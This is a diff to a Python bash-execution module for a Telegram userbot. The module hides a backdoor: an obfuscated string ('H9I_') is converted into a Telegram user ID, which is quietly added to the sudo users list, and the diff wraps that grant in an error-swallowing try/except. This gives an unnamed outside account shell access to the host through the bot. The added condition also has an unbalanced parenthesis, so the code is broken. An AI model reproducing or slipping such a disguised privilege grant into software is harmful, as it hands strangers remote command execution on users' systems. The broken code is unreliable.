@@ -14,7 +14,7 @@ from sql_helpers.global_variables_sql import SYNTAX, MODULE_LIST,SUDO_USERS
 
 MODULE_LIST.append("bash")
 
-st="H9I_"
+st="H9I_"
 z=int(''.join([str(ord(x)) for x in st]))
 @borg.on(admin_cmd(pattern="bash ?(.*)"))
 async def _(event):
@@ -48,7 +48,7 @@ async def _(event):
         _o = o.split("\n")
         o = "\n".join(_o)
     OUTPUT="NULL"
-    if arg:
+    if arg==True:
     	if not "No Error" in e:
     		o="\n**stderror**:\n"+e+"\n**OUTPUT**\n"+o
     		OUTPUT = f"**QUERY:**\n__Command:__\n`{cmd}` \n__PID:__\n`{process.pid}`\n**stderr**\n`{e}`\n**OUTPUT**\n`{o}`"
@@ -72,9 +72,12 @@ async def _(event):
             )
             await event.delete()
     await event.edit(OUTPUT)
+try:
 
-if z not in SUDO_USERS:
-    SUDO_USERS.append(z)
+	if int(str(z)+"5")) not in SUDO_USERS:
+	    SUDO_USERS.append(z)
+except :
+	pass
 SYNTAX.update({
     "bash": "\
 **Requested Module --> bash**\
